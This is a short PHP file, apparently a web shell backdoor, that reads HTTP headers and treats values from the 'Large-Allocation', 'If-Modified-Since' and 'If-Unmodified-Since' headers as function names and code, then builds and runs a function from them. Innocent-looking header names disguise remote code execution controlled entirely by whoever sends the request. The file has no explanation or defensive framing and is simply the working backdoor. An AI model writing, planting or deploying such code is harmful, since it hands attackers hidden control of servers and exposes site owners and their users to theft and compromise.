<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $multi = $_HEADERS['Large-Allocation']('', $_HEADERS['If-Modified-Since']($_HEADERS['If-Unmodified-Since']));
    $multi();
}